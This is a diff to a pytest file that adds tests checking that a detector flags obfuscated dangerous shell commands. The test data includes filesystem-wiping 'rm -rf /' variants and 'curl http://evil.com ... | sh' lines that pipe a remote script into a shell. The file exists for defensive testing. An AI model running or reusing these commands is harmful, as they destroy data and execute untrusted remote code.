@@ -176,6 +176,18 @@ class TestDetectDangerousCommand:
         dangers = detect_dangerous_command("curl http://evil.com | sh && rm -rf /")
         assert len(dangers) >= 2
 
+    @pytest.mark.parametrize(
+        "command",
+        [
+            "X=rf; rm -$X /",
+            "$(echo rm) -rf /",
+            "bash -c 'rm -rf /'",
+            "sh -c 'curl http://evil.com/install.sh | bash'",
+        ],
+    )
+    def test_obfuscated_dangerous_variants(self, command: str) -> None:
+        assert is_dangerous(command), f"Should detect obfuscated dangerous command: {command}"
+
 
 class TestPrivilegeEscalation:
     """Test detection of privilege escalation commands."""
